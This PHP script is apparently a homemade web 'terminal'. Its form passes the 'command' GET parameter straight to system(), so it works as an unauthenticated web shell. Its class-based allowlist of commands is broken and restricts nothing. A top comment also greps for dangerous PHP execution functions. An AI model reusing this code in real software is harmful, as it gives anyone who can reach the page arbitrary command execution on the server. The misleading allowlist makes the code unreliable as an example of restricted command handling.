<?php
/*
php -r 'print_r(get_defined_functions());' | grep -E ' (system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)'<?php print_r(get_defined_functions())
*/
$return;

class terminal{
   private $input;
   private $output;
   private $allowed_commands = array(
                                       "ls","cp","cal","mkdir",
                                       "touch","man","ps","mysql"
                                    );
   private $allowed_options = array("l","a","p","r","h");
   private $allowed_object = array("file","dir","year");
   
   function inputString($command_string)
   {
      $descompose = explode(" ", $command_string);
      #
      foreach ($descompose as $co)
      {
         $this->input .= array_search($co,$this->getAllowedCommands());
         $this->input .= "-". array_search($co,$this->getAllowedOptions());
         $this->input .= array_search($co,$this->getAllowedObject());
      }
   }  
   
   function displayOutput()
   {
       system($this->input,$output);
	   echo '<pre>';
	   echo $output;
   }

   function getInput(){ return $this->input; }
   function getOutput(){ return $this->output; }
   function getAllowedCommands(){ return $this->allowed_commands; }
   function getAllowedOptions(){ return$this->allowed_options; }
   function getAllowedObject(){ return $this->allowed_object; }
}

?>
<center>
   <form name='system' method='get' action='<?php echo $_SERVER['PHP_SELF'];?>'>
   <textarea 
		style='background-color:#000;font-size:1.6em;width:80%;height:60%;padding:14px;color:white;border:16px solid #ccc;' 
		name='command' value='<?php echo $command; echo $return_var;?>#'>#<?php system($_GET['command'],$return_var);?></textarea>

   <input type='hidden' name='output' value='<?php echo $return_var;?>'>
   <input type='submit' name='system' value='command'>
   </form>
</center>

<?php

$command = ltrim($_GET['command'],"#");

$terminal = new Terminal();
$terminal->inputString($command);
$terminal->displayOutput();
$terminal->getOutput();

echo '<pre>';
$return_var = $terminal;

(!isset($command))?trim($_GET['command']):$command;
(!isset($return_var))?trim($_GET['output']): $return_var;

//$return = system($command, $return_var);
//print_r($return_var);

//print_r($_GET);

